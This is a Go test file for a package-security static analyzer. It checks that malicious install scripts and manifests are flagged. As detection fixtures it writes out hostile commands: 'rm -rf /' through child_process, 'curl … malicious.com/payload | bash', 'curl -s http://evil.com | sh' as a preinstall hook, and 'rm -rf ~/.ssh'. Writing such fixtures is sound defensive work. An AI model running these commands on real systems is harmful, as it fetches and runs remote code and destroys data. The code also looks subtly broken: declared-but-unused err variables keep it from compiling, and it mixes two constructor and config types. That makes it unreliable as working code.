package static

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"typosentinel/internal/config"
	"typosentinel/pkg/types"
)

func TestNewAnalyzer(t *testing.T) {
	cfg := &Config{
		Enabled:               true,
		AnalyzeInstallScripts: true,
		AnalyzeManifests:      true,
		YaraRulesEnabled:      false,
		Timeout:               "30s",
	}

	analyzer, err := NewStaticAnalyzer(cfg)

	if analyzer == nil {
		t.Error("Expected analyzer to be created, got nil")
	}

	if analyzer.config != cfg {
		t.Error("Expected analyzer config to match provided config")
	}

	if !analyzer.enabled {
		t.Error("Expected analyzer to be enabled")
	}
}

func TestNewAnalyzer_Disabled(t *testing.T) {
	cfg := &Config{
		Enabled: false,
	}

	analyzer, err := NewStaticAnalyzer(cfg)

	if analyzer == nil {
		t.Error("Expected analyzer to be created even when disabled")
	}

	if analyzer.enabled {
		t.Error("Expected analyzer to be disabled")
	}
}

func TestAnalyzePackage_Success(t *testing.T) {
	cfg := &Config{
		Enabled:               true,
		AnalyzeInstallScripts: true,
		AnalyzeManifests:      true,
		YaraRulesEnabled:      false,
		Timeout:               "30s",
	}

	analyzer, _ := NewStaticAnalyzer(cfg)

	// Create test package
	testPkg := &types.Package{
		Name:    "test-package",
		Version: "1.0.0",
		Path:    "/tmp/test-package",
	}

	ctx := context.Background()
	result, err := analyzer.AnalyzePackage(ctx, testPkg)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	if result == nil {
		t.Error("Expected result to not be nil")
	}

	if result.PackageName != testPkg.Name {
		t.Errorf("Expected package name %s, got %s", testPkg.Name, result.PackageName)
	}

	if result.Version != testPkg.Version {
		t.Errorf("Expected version %s, got %s", testPkg.Version, result.Version)
	}
}

func TestAnalyzePackage_Disabled(t *testing.T) {
	cfg := &Config{
		Enabled: false,
	}

	analyzer, _ := NewStaticAnalyzer(cfg)

	testPkg := &types.Package{
		Name:    "test-package",
		Version: "1.0.0",
	}

	ctx := context.Background()
	result, err := analyzer.AnalyzePackage(ctx, testPkg)

	if err != nil {
		t.Errorf("Expected no error for disabled analyzer, got %v", err)
	}

	if result == nil {
		t.Error("Expected result to not be nil even when disabled")
	}

	if result.RiskScore != 0 {
		t.Errorf("Expected risk score 0 for disabled analyzer, got %f", result.RiskScore)
	}
}

func TestAnalyzePackage_Timeout(t *testing.T) {
	cfg := &Config{
		Enabled: true,
		Timeout: "1ms", // Very short timeout
	}

	analyzer, _ := NewStaticAnalyzer(cfg)

	testPkg := &types.Package{
		Name: "test-package",
		Path: "/tmp/test-package",
	}

	ctx := context.Background()
	_, err := analyzer.AnalyzePackage(ctx, testPkg)

	// Should handle timeout gracefully
	if err != nil && !strings.Contains(err.Error(), "timeout") && !strings.Contains(err.Error(), "context") {
		t.Errorf("Expected timeout or context error, got %v", err)
	}
}

func TestAnalyze_Success(t *testing.T) {
	cfg := &Config{
		Enabled:               true,
		AnalyzeInstallScripts: true,
		AnalyzeManifests:      true,
		YaraRulesEnabled:      false,
		Timeout:               "30s",
	}

	analyzer, _ := NewStaticAnalyzer(cfg)

	// Create temporary test directory with files
	tempDir, err := os.MkdirTemp("", "static_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	// Create test package.json
	packageJSON := `{"name": "test-package", "version": "1.0.0", "scripts": {"install": "node install.js"}}`
	err = os.WriteFile(filepath.Join(tempDir, "package.json"), []byte(packageJSON), 0644)
	if err != nil {
		t.Fatalf("Failed to create package.json: %v", err)
	}

	// Create test install script
	installScript := `console.log("Installing...");\nrequire('child_process').exec('rm -rf /');`
	err = os.WriteFile(filepath.Join(tempDir, "install.js"), []byte(installScript), 0644)
	if err != nil {
		t.Fatalf("Failed to create install.js: %v", err)
	}

	ctx := context.Background()
	result, err := analyzer.Analyze(ctx, tempDir)

	if err != nil {
		t.Errorf("Expected no error, got %v", err)
	}

	if result == nil {
		t.Error("Expected result to not be nil")
	}

	if len(result.Findings) == 0 {
		t.Error("Expected some findings for suspicious script")
	}

	// Should detect the dangerous rm command
	foundDangerousCommand := false
	for _, finding := range result.Findings {
		if strings.Contains(strings.ToLower(finding.Description), "dangerous") ||
			strings.Contains(strings.ToLower(finding.Description), "suspicious") {
			foundDangerousCommand = true
			break
		}
	}

	if !foundDangerousCommand {
		t.Error("Expected to find dangerous command in findings")
	}
}

func TestAnalyzeInstallScript(t *testing.T) {
	cfg := &config.Config{
		Static: config.StaticConfig{
			Enabled: true,
		},
	}

	analyzer := NewAnalyzer(cfg)

	// Create temporary script file
	tempDir, err := os.MkdirTemp("", "script_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	scriptPath := filepath.Join(tempDir, "install.sh")
	suspiciousScript := `#!/bin/bash\necho "Installing..."\ncurl -s http://malicious.com/payload | bash\nrm -rf /tmp/*`
	err = os.WriteFile(scriptPath, []byte(suspiciousScript), 0755)
	if err != nil {
		t.Fatalf("Failed to create script: %v", err)
	}

	findings := analyzer.analyzeInstallScript(scriptPath)

	if len(findings) == 0 {
		t.Error("Expected findings for suspicious script")
	}

	// Should detect network calls and file operations
	foundNetworkCall := false
	foundFileOp := false
	for _, finding := range findings {
		desc := strings.ToLower(finding.Description)
		if strings.Contains(desc, "network") || strings.Contains(desc, "curl") {
			foundNetworkCall = true
		}
		if strings.Contains(desc, "file") || strings.Contains(desc, "rm") {
			foundFileOp = true
		}
	}

	if !foundNetworkCall {
		t.Error("Expected to detect network call")
	}
	if !foundFileOp {
		t.Error("Expected to detect file operation")
	}
}

func TestAnalyzeManifest(t *testing.T) {
	cfg := &config.Config{
		Static: config.StaticConfig{
			Enabled: true,
		},
	}

	analyzer := NewAnalyzer(cfg)

	// Create temporary manifest file
	tempDir, err := os.MkdirTemp("", "manifest_test")
	if err != nil {
		t.Fatalf("Failed to create temp dir: %v", err)
	}
	defer os.RemoveAll(tempDir)

	manifestPath := filepath.Join(tempDir, "package.json")
	suspiciousManifest := `{
		"name": "test-package",
		"version": "1.0.0",
		"scripts": {
			"preinstall": "curl -s http://evil.com | sh",
			"postinstall": "rm -rf ~/.ssh"
		},
		"dependencies": {
			"lodash": "^4.17.21"
		}
	}`
	err = os.WriteFile(manifestPath, []byte(suspiciousManifest), 0644)
	if err != nil {
		t.Fatalf("Failed to create manifest: %v", err)
	}

	findings := analyzer.analyzeManifest(manifestPath)

	if len(findings) == 0 {
		t.Error("Expected findings for suspicious manifest")
	}

	// Should detect suspicious scripts
	foundSuspiciousScript := false
	for _, finding := range findings {
		if strings.Contains(strings.ToLower(finding.Description), "script") {
			foundSuspiciousScript = true
			break
		}
	}

	if !foundSuspiciousScript {
		t.Error("Expected to detect suspicious scripts")
	}
}

func TestIsManifest(t *testing.T) {
	tests := []struct {
		filename string
		expected bool
	}{
		{"package.json", true},
		{"package-lock.json", true},
		{"yarn.lock", true},
		{"Gemfile", true},
		{"requirements.txt", true},
		{"Cargo.toml", true},
		{"pom.xml", true},
		{"build.gradle", true},
		{"composer.json", true},
		{"random.txt", false},
		{"README.md", false},
		{"src/main.js", false},
	}

	cfg := &config.Config{}
	analyzer := NewAnalyzer(cfg)

	for _, test := range tests {
		t.Run(test.filename, func(t *testing.T) {
			result := analyzer.isManifest(test.filename)
			if result != test.expected {
				t.Errorf("isManifest(%s) = %v, expected %v", test.filename, result, test.expected)
			}
		})
	}
}

func TestCalculateRiskScore(t *testing.T) {
	cfg := &config.Config{}
	analyzer := NewAnalyzer(cfg)

	tests := []struct {
		name     string
		findings []types.SecurityFinding
		minScore float64
		maxScore float64
	}{
		{
			name:     "no findings",
			findings: []types.SecurityFinding{},
			minScore: 0,
			maxScore: 0,
		},
		{
			name: "low risk findings",
			findings: []types.SecurityFinding{
				{Severity: "low", RiskScore: 2.0},
				{Severity: "low", RiskScore: 1.5},
			},
			minScore: 1.0,
			maxScore: 3.0,
		},
		{
			name: "high risk findings",
			findings: []types.SecurityFinding{
				{Severity: "high", RiskScore: 8.0},
				{Severity: "critical", RiskScore: 9.5},
			},
			minScore: 7.0,
			maxScore: 10.0,
		},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			score := analyzer.calculateRiskScore(test.findings)
			if score < test.minScore || score > test.maxScore {
				t.Errorf("calculateRiskScore() = %f, expected between %f and %f", score, test.minScore, test.maxScore)
			}
		})
	}
}

func TestDetermineThreatLevel(t *testing.T) {
	cfg := &config.Config{}
	analyzer := NewAnalyzer(cfg)

	tests := []struct {
		riskScore float64
		expected  string
	}{
		{0.0, "low"},
		{2.5, "low"},
		{3.0, "low"},
		{4.0, "medium"},
		{6.5, "medium"},
		{7.0, "high"},
		{8.5, "high"},
		{9.0, "critical"},
		{10.0, "critical"},
	}

	for _, test := range tests {
		t.Run("score_"+strings.ReplaceAll(string(rune(int(test.riskScore*10))), ".", "_"), func(t *testing.T) {
			result := analyzer.determineThreatLevel(test.riskScore)
			if result != test.expected {
				t.Errorf("determineThreatLevel(%f) = %s, expected %s", test.riskScore, result, test.expected)
			}
		})
	}
}